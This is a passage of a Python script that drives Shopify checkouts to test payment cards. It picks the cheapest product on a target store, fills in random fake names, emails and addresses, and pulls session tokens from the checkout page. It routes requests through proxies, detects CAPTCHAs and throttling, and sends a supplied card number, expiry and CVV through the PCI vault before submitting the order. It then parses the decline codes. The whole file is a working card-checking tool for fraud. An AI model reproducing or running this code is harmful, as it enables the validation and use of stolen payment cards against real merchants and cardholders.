IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on OffsitePaymentMethod{paymentMethodIdentifier name __typename}...on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}...on ManualPaymentMethod{id name paymentMethodIdentifier __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}...on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}...on NoopPaymentMethod{__typename}__typename}__typename}
"""

QUERY_PROPOSAL_DELIVERY = QUERY_PROPOSAL_SHIPPING

MUTATION_SUBMIT = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{buyerProposal{__typename}sellerProposal{__typename}errors{...on NegotiationError{code localizedMessage nonLocalizedMessage localizedMessageHtml __typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationSchedulingFailure{__typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}__typename}"""

QUERY_POLL = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl orderStatusPageUrl customerId isFirstOrder orderCreationStatus{__typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationSchedulingFailure{__typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}"""

# ==================== HELPERS ====================

C2C = {"USD": "US", "CAD": "CA", "INR": "IN", "AED": "AE", "HKD": "HK", "GBP": "GB", "CHF": "CH"}

book = {
    "US": {"address1": "123 Main St", "city": "New York", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
    "CA": {"address1": "88 Queen St", "city": "Toronto", "postalCode": "M5J2J3", "zoneCode": "ON", "countryCode": "CA", "phone": "4165550198"},
    "GB": {"address1": "221B Baker Street", "city": "London", "postalCode": "NW1 6XE", "zoneCode": "LND", "countryCode": "GB", "phone": "2079460123"},
    "IN": {"address1": "221B MG Road", "city": "Mumbai", "postalCode": "400001", "zoneCode": "MH", "countryCode": "IN", "phone": "+91 9876543210"},
    "AE": {"address1": "Burj Tower", "city": "Dubai", "postalCode": "00000", "zoneCode": "DU", "countryCode": "AE", "phone": "+971 50 123 4567"},
    "HK": {"address1": "Nathan 88", "city": "Kowloon", "postalCode": "999077", "zoneCode": "KL", "countryCode": "HK", "phone": "+852 5555 5555"},
    "CN": {"address1": "8 Zhongguancun Street", "city": "Beijing", "postalCode": "100080", "zoneCode": "BJ", "countryCode": "CN", "phone": "1062512345"},
    "CH": {"address1": "Gotthardstrasse 17", "city": "Schweiz", "postalCode": "6430", "zoneCode": "SZ", "countryCode": "CH", "phone": "445512345"},
    "AU": {"address1": "1 Martin Place", "city": "Sydney", "postalCode": "2000", "zoneCode": "NSW", "countryCode": "AU", "phone": "291234567"},
    "DEFAULT": {"address1": "123 Main St", "city": "New York", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
}


def pick_addr(url, cc=None, rc=None):
    cc = (cc or "").upper()
    rc = (rc or "").upper()
    try:
        dom = urlparse(url).netloc
        tcn = dom.split('.')[-1].upper()
    except Exception:
        tcn = ""
    if tcn in book:
        return book[tcn]
    ccn = C2C.get(cc)
    if rc in book and ccn == rc:
        return book[rc]
    elif rc in book:
        return book[rc]
    return book["DEFAULT"]


def capture(data, first, last):
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[start:end]
    except ValueError:
        return None


def extract_between(text, start, end):
    if not text or not start or not end:
        return None
    try:
        if start in text:
            parts = text.split(start, 1)
            if len(parts) > 1 and end in parts[1]:
                result = parts[1].split(end, 1)[0]
                return result if result else None
        return None
    except Exception:
        return None


def safe_get(d, *keys, default=None):
    cur = d
    for k in keys:
        if not isinstance(cur, dict):
            return default
        cur = cur.get(k)
        if cur is None:
            return default
    return cur


class Utils:
    @staticmethod
    def get_random_name():
        first_names = ["James", "John", "Robert", "Michael", "William", "David", "Mary", "Patricia", "Jennifer", "Linda"]
        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez"]
        return (random.choice(first_names), random.choice(last_names))

    @staticmethod
    def generate_email(first, last):
        domains = ["gmail.com", "yahoo.com", "outlook.com", "protonmail.com"]
        return f"{first.lower()}.{last.lower()}{random.randint(1,999)}@{random.choice(domains)}"


def parse_proxy(proxy_str):
    if not proxy_str:
        return None
    parts = proxy_str.split(':')
    if len(parts) == 2:
        ip, port = parts
        return f"http://{ip}:{port}"
    elif len(parts) == 4:
        ip, port, user, password = parts
        return f"http://{user}:{password}@{ip}:{port}"
    return None


def is_captcha_required(response_text):
    if not response_text:
        return False
    indicators = ['CAPTCHA_REQUIRED', '"code":"CAPTCHA_REQUIRED"', "'code':'CAPTCHA_REQUIRED'",
                  'captcha required', 'CAPTCHA CHALLENGE', 'hcaptcha', 'h-captcha']
    text_upper = response_text.upper()
    return any(ind.upper() in text_upper for ind in indicators)


async def make_graphql_request(session, graphql_url, params, headers, json_data, proxy, max_retries=1):
    last_resp, last_text = None, ""
    for attempt in range(max_retries + 1):
        try:
            async with session.post(graphql_url, params=params, headers=headers, json=json_data, proxy=proxy) as response:
                last_text = await response.text()
                last_resp = response
                return response, last_text
        except Exception as e:
            logger.warning(f"GraphQL request attempt {attempt+1} failed: {e}")
            if attempt == max_retries:
                return None, str(e)
            await asyncio.sleep(1)
    return last_resp, last_text


async def fetch_products(domain, proxy_str=None):
    try:
        if not domain.startswith('http'):
            domain = "https://" + domain
        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=15)
        proxy = parse_proxy(proxy_str) if proxy_str else None
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            async with session.get(f"{domain}/products.json", proxy=proxy) as resp:
                if resp.status != 200:
                    return False, f"Site Error! Status: {resp.status}"
                text = await resp.text()
                if "shopify" not in text.lower():
                    return False, "Not Shopify!"
                data = await resp.json()
                result = data.get('products', [])
                if not result:
                    return False, "No Products!"

        min_price = float('inf')
        min_product = None
        for product in result:
            for variant in product.get('variants', []):
                if not variant.get('available', True):
                    continue
                try:
                    price = variant.get('price', '0')
                    price = float(str(price).replace(',', ''))
                    if price < min_price:
                        min_price = price
                        min_product = {
                            'site': domain,
                            'price': f"{price:.2f}",
                            'variant_id': str(variant['id']),
                            'link': f"{domain}/products/{product['handle']}"
                        }
                except (ValueError, TypeError, AttributeError):
                    continue
        if min_product:
            return min_product
        return False, "No Valid Products"
    except aiohttp.ClientError as e:
        return False, f"Proxy Error: {str(e)}"
    except Exception as e:
        return False, f"error: {str(e)}"


def extract_clean_response(message):
    if not message:
        return "UNKNOWN_ERROR"
    message = str(message)
    patterns = [
        r'(PAYMENTS_[A-Z_]+)', r'(CARD_[A-Z_]+)',
        r'([A-Z]+_[A-Z]+_[A-Z_]+)', r'([A-Z]+_[A-Z_]+)',
        r'code["\']?\s*[:=]\s*["\']?([^"\',]+)["\']?',
        r'{"code":"([^"]+)"', r"'code':'([^']+)'"
    ]
    for pattern in patterns:
        matches = re.findall(pattern, message, re.IGNORECASE)
        for match in matches:
            if isinstance(match, tuple):
                match = match[0]
            if match and "_" in match and len(match) < 60:
                return match.strip("{}:'\" ")
    words = message.split()
    if words and "_" in words[0] and words[0].isupper():
        return words[0]
    return message[:80]


# ==================== MAIN LOGIC ====================

async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
    gateway = "UNKNOWN"
    total_price = "0.00"
    currency = "USD"

    ourl = site_url if site_url.startswith('http') else f'https://{site_url}'
    proxy = parse_proxy(proxy_str) if proxy_str else None
    checkpoint_data = None
    running_total = "0.00"

    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/json',
            'Origin': ourl,
            'Referer': ourl,
            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"'
        }

        address_info = pick_addr(ourl)
        country_code = address_info["countryCode"]
        firstName, lastName = Utils.get_random_name()
        email = Utils.generate_email(firstName, lastName)
        phone = address_info["phone"]
        street = address_info["address1"]
        city = address_info["city"]
        state = address_info["zoneCode"]
        s_zip = address_info["postalCode"]
        address2 = ""

        if not variant_id:
            info = await fetch_products(ourl, proxy_str)
            if isinstance(info, tuple):
                return False, info[1], gateway, total_price, currency
            if not info or not isinstance(info, dict):
                return False, 'No valid product found', gateway, total_price, currency
            variant_id = info['variant_id']
            if total_price == '0.00':
                total_price = str(info.get('price', '0.00'))

        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=45)

        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            url = ourl
            cart = url + '/cart/add.js'
            checkout = url + '/checkout/'

            cart_headers = {**headers, 'Content-Type': 'application/x-www-form-urlencoded',
                            'Accept': 'application/json, text/javascript'}
            try:
                cart_resp = await session.post(cart, data=f'id={variant_id}&quantity=1',
                                               headers=cart_headers, proxy=proxy)
            except Exception as e:
                return False, f"Cart request failed: {str(e)[:80]}", gateway, total_price, currency

            if cart_resp.status != 200:
                cart_data = {'items': [{'id': int(variant_id), 'quantity': 1}]}
                cart_headers_alt = {**headers, 'Content-Type': 'application/json', 'Accept': 'application/json'}
                cart_resp = await session.post(cart, json=cart_data, headers=cart_headers_alt, proxy=proxy)

            if cart_resp.status != 200:
                cart_text = await cart_resp.text()
                return False, f"Cart failed ({cart_resp.status}): {cart_text[:100]}", gateway, total_price, currency

            checkout_headers = {**headers,
                                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                                'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate',
                                'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1'}
            try:
                response = await session.post(url=checkout, allow_redirects=True,
                                              headers=checkout_headers, proxy=proxy)
            except Exception as e:
                return False, f"Checkout request failed: {str(e)[:80]}", gateway, total_price, currency

            checkout_url = str(response.url)
            if 'login' in checkout_url.lower():
                return False, "Site requires login!", gateway, total_price, currency

            text = await response.text()
            if not text or len(text) < 200:
                return False, f"Empty checkout page ({len(text)} bytes)", gateway, total_price, currency

            unescaped = html_module.unescape(text)

            attempt_token = None
            m = re.search(r'/checkouts/(?:cn/)?([^/?]+)', checkout_url)
            if m:
                attempt_token = m.group(1)
            else:
                attempt_token = checkout_url.rstrip('/').split('/')[-1].split('?')[0]
            if not attempt_token or len(attempt_token) < 8:
                return False, "Failed to extract attempt token", gateway, total_price, currency

            sst = None
            for hdr in ['X-Checkout-One-Session-Token', 'x-checkout-one-session-token',
                        'X-Shopify-Checkout-Session-Token']:
                sst = response.headers.get(hdr)
                if sst:
                    break
            if not sst:
                patterns = [
                    r'"serializedSessionToken"\s*:\s*"([^"]+)"',
                    r'"sessionToken"\s*:\s*"([^"]+)"',
                    r'serialized-sessionToken"\s+content="([^"]+)"',
                    r'data-session-token="([^"]+)"',
                    r'"checkoutSessionToken"\s*:\s*"([^"]+)"',
                ]
                for pat in patterns:
                    m = re.search(pat, unescaped)
                    if m:
                        sst = m.group(1).strip()
                        break
            if not sst:
                m = re.search(r'/checkouts/(?:cn/)?([a-f0-9]{32,})', checkout_url)
                if m:
                    sst = m.group(1)
            if not sst:
                return False, "Failed to get session token", gateway, total_price, currency

            queueToken = (extract_between(unescaped, '"queueToken":"', '"') or "")
            stableId = (extract_between(unescaped, '"stableId":"', '"') or
                        extract_between(unescaped, 'stableId":"', '"') or "1")

            merch = None
            for pat in [r'ProductVariantMerchandise/(\d+)', r'"merchandiseId":"gid://shopify/ProductVariantMerchandise/(\d+)"']:
                m = re.search(pat, unescaped)
                if m:
                    merch = m.group(1)
                    break
            if not merch:
                merch = str(variant_id)

            currency = "USD"
            for pat in [r'"currencyCode":"([A-Z]{3})"', r'currencyCode":"([A-Z]{3})"']:
                m = re.search(pat, unescaped)
                if m:
                    currency = m.group(1)
                    break

            subtotal = None
            for pat in [r'"subtotalBeforeTaxesAndShipping":\{"value":\{"amount":"([\d.]+)"',
                        r'subtotalBeforeTaxesAndShipping":{"value":{"amount":"([\d.]+)"']:
                m = re.search(pat, unescaped)
                if m:
                    subtotal = m.group(1)
                    break
            if not subtotal:
                m = re.search(r'"price":\s*"([\d.]+)"', unescaped)
                subtotal = m.group(1) if m else "0.01"

            build_id = None
            m = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unescaped)
            if m:
                build_id = m.group(1)

            source_token = extract_between(text, 'name="serialized-sourceToken" content="', '"')
            if source_token:
                source_token = source_token.replace('&quot;', '').strip('"')

            ident_sig = None
            m = re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"', unescaped)
            if m:
                ident_sig = m.group(1)

            headers.update({
                'shopify-checkout-client': 'checkout-web/1.0',
                'shopify-checkout-source': f'id="{attempt_token}", type="cn"',
                'x-checkout-one-session-token': sst,
                'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin',
            })
            if build_id:
                headers['x-checkout-web-build-id'] = build_id
                headers['x-checkout-web-deploy-stage'] = 'production'
                headers['x-checkout-web-server-handling'] = 'fast'
                headers['x-checkout-web-server-rendering'] = 'yes'
            if source_token:
                headers['x-checkout-web-source-id'] = source_token

            params = {'operationName': 'Proposal'}
            graphql_url = f'https://{urlparse(ourl).netloc}/checkouts/unstable/graphql'

            json_data = {
                'query': QUERY_PROPOSAL_SHIPPING,
                'operationName': 'Proposal',
                'variables': {
                    'sessionInput': {'sessionToken': sst},
                    'queueToken': queueToken,
                    'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                    'delivery': {
                        'deliveryLines': [{
                            'destination': {'partialStreetAddress': {
                                'address1': street, 'address2': address2, 'city': city,
                                'countryCode': country_code, 'postalCode': s_zip,
                                'firstName': firstName, 'lastName': lastName,
                                'zoneCode': state, 'phone': phone}},
                            'selectedDeliveryStrategy': {
                                'deliveryStrategyMatchingConditions': {
                                    'estimatedTimeInTransit': {'any': True},
                                    'shipments': {'any': True}},
                                'options': {}},
                            'targetMerchandiseLines': {'any': True},
                            'deliveryMethodTypes': ['SHIPPING'],
                            'expectedTotalPrice': {'any': True},
                            'destinationChanged': True
                        }],
                        'noDeliveryRequired': [],
                        'useProgressiveRates': False,
                        'prefetchShippingRatesStrategy': None,
                        'supportsSplitShipping': True
                    },
                    'deliveryExpectations': {'deliveryExpectationLines': []},
                    'merchandise': {'merchandiseLines': [{
                        'stableId': stableId,
                        'merchandise': {'productVariantReference': {
                            'id': f'gid://shopify/ProductVariantMerchandise/{merch}',
                            'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                            'properties': [], 'sellingPlanId': None, 'sellingPlanDigest': None}},
                        'quantity': {'items': {'value': 1}},
                        'expectedTotalPrice': {'value': {'amount': subtotal, 'currencyCode': currency}},
                        'lineComponentsSource': None, 'lineComponents': []}]},
                    'payment': {
                        'totalAmount': {'any': True}, 'paymentLines': [],
                        'billingAddress': {'streetAddress': {
                            'address1': '', 'city': '', 'countryCode': country_code,
                            'lastName': '', 'zoneCode': 'ENG', 'phone': ''}}},
                    'buyerIdentity': {
                        'customer': {'presentmentCurrency': currency, 'countryCode': country_code},
                        'email': email, 'emailChanged': False, 'phoneCountryCode': country_code,
                        'marketingConsent': [{'email': {'value': email}}],
                        'shopPayOptInPhone': {'countryCode': country_code}, 'rememberMe': False},
                    'tip': {'tipLines': []},
                    'taxes': {'proposedAllocations': None,
                              'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': currency}},
                              'proposedTotalIncludedAmount': None,
                              'proposedMixedStateTotalAmount': None, 'proposedExemptions': []},
                    'note': {'message': None, 'customAttributes': []},
                    'localizationExtension': {'fields': []},
                    'nonNegotiableTerms': None,
                    'scriptFingerprint': {'signature': None, 'signatureUuid': None,
                                          'lineItemScriptChanges': [], 'paymentScriptChanges': [],
                                          'shippingScriptChanges': []},
                    'optionalDuties': {'buyerRefusesDuties': False}
                }
            }

            response, resp_text = await make_graphql_request(session, graphql_url, params, headers, json_data, proxy)
            await asyncio.sleep(2)

            if not resp_text:
                return False, "Empty GraphQL response (shipping)", gateway, total_price, currency
            if is_captcha_required(resp_text):
                return False, "CAPTCHA_REQUIRED", gateway, total_price, currency

            try:
                resp_json = json.loads(resp_text)
            except json.JSONDecodeError as e:
                return False, f"Invalid JSON (shipping): {str(e)[:80]}", gateway, total_price, currency

            if not isinstance(resp_json, dict):
                return False, f"Non-dict JSON: {type(resp_json).__name__}", gateway, total_price, currency

            if resp_json.get('errors'):
                errs = resp_json['errors']
                msgs = [e.get('message', str(e)) for e in errs[:3] if isinstance(e, dict)]
                return False, f"GraphQL Error: {'; '.join(msgs)[:150]}", gateway, total_price, currency

            data = resp_json.get('data')
            if not isinstance(data, dict):
                return False, "No data in proposal response", gateway, total_price, currency

            session_data = data.get('session')
            if not isinstance(session_data, dict):
                return False, "Session is null", gateway, total_price, currency

            negotiate = session_data.get('negotiate')
            if not isinstance(negotiate, dict):
                return False, "Negotiate is null", gateway, total_price, currency

            result = negotiate.get('result')
            if not isinstance(result, dict):
                return False, "Result is null", gateway, total_price, currency

            result_type = result.get('__typename', 'Unknown')
            if result_type == 'CheckpointDenied':
                return False, "Checkpoint Denied", gateway, total_price, currency
            if result_type == 'Throttled':
                return False, "Throttled - change proxy", gateway, total_price, currency
            if result_type == 'NegotiationResultFailed':
                return False, "Negotiation failed", gateway, total_price, currency

            checkpoint_data = result.get('checkpointData')

            seller_proposal = result.get('sellerProposal')
            if not isinstance(seller_proposal, dict):
                return False, "Seller proposal is null", gateway, total_price, currency

            running_total_data = seller_proposal.get('runningTotal')
            if not isinstance(running_total_data, dict):
                return False, "No runningTotal", gateway, total_price, currency
            running_total = safe_get(running_total_data, 'value', 'amount', default="0.00")

            delivery_data = seller_proposal.get('delivery')
            delivery_strategy = ''
            shipping_amount = 0.0

            if isinstance(delivery_data, dict) and delivery_data.get('__typename') == 'FilledDeliveryTerms':
                delivery_lines = delivery_data.get('deliveryLines') or []
                if delivery_lines and isinstance(delivery_lines[0], dict):
                    available = delivery_lines[0].get('availableDeliveryStrategies') or []
                    if available and isinstance(available[0], dict):
                        delivery_strategy = available[0].get('handle', '')
                        shipping_amount = float(safe_get(available[0], 'amount', 'value', 'amount', default="0") or 0)

            tax_amount = 0.0
            tax_data = seller_proposal.get('tax')
            if isinstance(tax_data, dict) and tax_data.get('__typename') == 'FilledTaxTerms':
                tax_amount = float(safe_get(tax_data, 'totalTaxAmount', 'value', 'amount', default="0") or 0)

            payment_identifier = None
            payment_data = seller_proposal.get('payment')
            if isinstance(payment_data, dict) and payment_data.get('__typename') == 'FilledPaymentTerms':
                methods = payment_data.get('availablePaymentLines') or []
                for method in methods:
                    if not isinstance(method, dict):
                        continue
                    pm = method.get('paymentMethod', {})
                    if not isinstance(pm, dict):
                        continue
                    pm_id = pm.get('paymentMethodIdentifier') or pm.get('id') or pm.get('name')
                    pm_name = pm.get('extensibilityDisplayName') or pm.get('displayName') or pm.get('name')
                    if pm_id:
                        payment_identifier = pm_id
                        gateway = pm_name or pm_id
                        break

            if not payment_identifier:
                payment_identifier = "shopify_payments"
                gateway = "Shopify Payments"

            total_price = str(round(float(running_total) + shipping_amount + tax_amount, 2))

            # Second proposal (delivery)
            json_data['query'] = QUERY_PROPOSAL_DELIVERY
            json_data['variables']['delivery']['deliveryLines'][0]['selectedDeliveryStrategy'] = {
                'deliveryStrategyByHandle': {
                    'handle': delivery_strategy, 'customDeliveryRate': False},
                'options': {}}
            json_data['variables']['delivery']['deliveryLines'][0]['targetMerchandiseLines'] = {
                'lines': [{'stableId': stableId}]}
            json_data['variables']['delivery']['deliveryLines'][0]['expectedTotalPrice'] = {
                'value': {'amount': str(shipping_amount), 'currencyCode': currency}}
            json_data['variables']['delivery']['deliveryLines'][0]['destinationChanged'] = False
            json_data['variables']['payment']['billingAddress'] = {
                'streetAddress': {
                    'address1': street, 'address2': address2, 'city': city,
                    'countryCode': country_code, 'postalCode': s_zip,
                    'firstName': firstName, 'lastName': lastName,
                    'zoneCode': state, 'phone': phone}}
            json_data['variables']['taxes']['proposedTotalAmount']['value']['amount'] = str(tax_amount)
            json_data['variables']['buyerIdentity']['shopPayOptInPhone']['number'] = phone

            response, resp_text2 = await make_graphql_request(session, graphql_url, params, headers, json_data, proxy)
            if is_captcha_required(resp_text2):
                return False, "CAPTCHA_REQUIRED (delivery)", gateway, total_price, currency

            # Vault the card
            vault_payload = {
                "credit_card": {
                    "number": cc, "month": int(mes), "year": int(ano),
                    "verification_value": cvv, "start_month": None, "start_year": None,
                    "issue_number": "", "name": f"{firstName} {lastName}"},
                "payment_session_scope": urlparse(url).netloc
            }
            vault_headers = {
                'Content-Type': 'application/json', 'Accept': 'application/json',
                'Accept-Language': 'en-US,en;q=0.9',
                'Origin': 'https://checkout.pci.shopifyinc.com',
                'Referer': 'https://checkout.pci.shopifyinc.com/',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
                'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
                'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin',
                'sec-fetch-storage-access': 'active'
            }
            if ident_sig:
                vault_headers['shopify-identification-signature'] = ident_sig

            try:
                vault_resp = await session.post('https://checkout.pci.shopifyinc.com/sessions',
                                                json=vault_payload, headers=vault_headers, proxy=proxy)
                token_data = await vault_resp.json()
                token = token_data.get('id') if isinstance(token_data, dict) else None
                if not token:
                    return False, f"No vault token: {str(token_data)[:100]}", gateway, total_price, currency
            except Exception as e:
                return False, f"Vault failed: {str(e)[:80]}", gateway, total_price, currency

            submit_variables = {
                'input': {
                    'sessionInput': {'sessionToken': sst},
                    'queueToken': queueToken,
                    'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                    'delivery': {
                        'deliveryLines': [{
                            'destination': {'streetAddress': {
                                'address1': street, 'address2': address2, 'city': city,
                                'countryCode': country_code, 'postalCode': s_zip,
                                'firstName': firstName, 'lastName': lastName,
                                'zoneCode': state, 'phone': phone}},
                            'selectedDeliveryStrategy': {
                                'deliveryStrategyByHandle': {
                                    'handle': delivery_strategy, 'customDeliveryRate': False},
                                'options': {'phone': phone}},
                            'targetMerchandiseLines': {'lines': [{'stableId': stableId}]},
                            'deliveryMethodTypes': ['SHIPPING'],
                            'expectedTotalPrice': {'value': {'amount': str(shipping_amount), 'currencyCode': currency}},
                            'destinationChanged': False
                        }],
                        'noDeliveryRequired': [], 'useProgressiveRates': True,
                        'prefetchShippingRatesStrategy': None, 'supportsSplitShipping': True
                    },
                    'merchandise': {'merchandiseLines': [{
                        'stableId': stableId,
                        'merchandise': {'productVariantReference': {
                            'id': f'gid://shopify/ProductVariantMerchandise/{merch}',
                            'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                            'properties': [], 'sellingPlanId': None, 'sellingPlanDigest': None}},
                        'quantity': {'items': {'value': 1}},
                        'expectedTotalPrice': {'value': {'amount': subtotal, 'currencyCode': currency}},
                        'lineComponentsSource': None, 'lineComponents': []}]},
                    'payment': {
                        'totalAmount': {'any': True},
                        'paymentLines': [{
                            'paymentMethod': {'directPaymentMethod': {
                                'paymentMethodIdentifier': payment_identifier,
                                'sessionId': token,
                                'billingAddress': {'streetAddress': {
                                    'address1': street, 'address2': address2, 'city': city,
                                    'countryCode': country_code, 'postalCode': s_zip,
                                    'firstName': firstName, 'lastName': lastName,
                                    'zoneCode': state, 'phone': phone}},
                                'cardSource': None}},
                            'amount': {'value': {'amount': running_total, 'currencyCode': currency}},
                            'dueAt': None}],
                        'billingAddress': {'streetAddress': {
                            'address1': street, 'address2': address2, 'city': city,
                            'countryCode': country_code, 'postalCode': s_zip,
                            'firstName': firstName, 'lastName': lastName,
                            'zoneCode': state, 'phone': phone}}},
                    'buyerIdentity': {
                        'customer': {'presentmentCurrency': currency, 'countryCode': country_code},
                        'email': email, 'emailChanged': False, 'phoneCountryCode': country_code,
                        'marketingConsent': [{'email': {'value': email}}],
                        'shopPayOptInPhone': {'number': phone, 'countryCode': country_code},
                        'rememberMe': False},
                    'taxes': {'proposedAllocations': None,
                              'proposedTotalAmount': {'value': {'amount': str(tax_amount), 'currencyCode': currency}},
                              'proposedTotalIncludedAmount': None,
                              'proposedMixedStateTotalAmount': None, 'proposedExemptions': []},
                    'tip': {'tipLines': []},
                    'note': {'message': None, 'customAttributes': []},
                    'localizationExtension': {'fields': []},
                    'nonNegotiableTerms': None,
                    'optionalDuties': {'buyerRefusesDuties': False}
                },
                'attemptToken': attempt_token,
                'metafields': [],
                'analytics': {'requestUrl': checkout_url}
            }
            if checkpoint_data:
                submit_variables['input']['checkpointData'] = checkpoint_data

            submit_json = {'query': MUTATION_SUBMIT, 'variables': submit_variables,
                           'operationName': 'SubmitForCompletion'}

            response, submit_text = await make_graphql_request(
                session, graphql_url, params, headers, submit_json, proxy)

            if is_captcha_required(submit_text):
                return False, "CAPTCHA_REQUIRED (submit)", gateway, total_price, currency
            if "Your order total has changed." in submit_text:
                return False, "Site not supported (total changed)", gateway, total_price, currency
            if "The requested payment method is not available." in submit_text:
                return False, "Payment method not available", gateway, total_price, currency

            try:
                sub_json = json.loads(submit_text)
            except json.JSONDecodeError:
                return False, f"Invalid JSON (submit): {submit_text[:120]}", gateway, total_price, currency

            if not isinstance(sub_json, dict):
                return False, f"Non-dict submit response", gateway, total_price, currency

            if sub_json.get('errors'):
                errs = sub_json['errors']
                for err in errs:
                    if isinstance(err, dict):
                        code = err.get('code') or err.get('message')
                        if code:
                            return False, extract_clean_response(str(code)), gateway, total_price, currency
                return False, "Submit GraphQL error", gateway, total_price, currency

            submit_data = safe_get(sub_json, 'data', 'submitForCompletion', default={})
            if not isinstance(submit_data, dict):
                return False, "Empty submit response", gateway, total_price, currency

            result_type = submit_data.get('__typename', '')
            rid = None

            if result_type in ('SubmitSuccess', 'SubmittedForCompletion', 'SubmitAlreadyAccepted'):
                receipt = submit_data.get('receipt', {})
                if isinstance(receipt, dict):
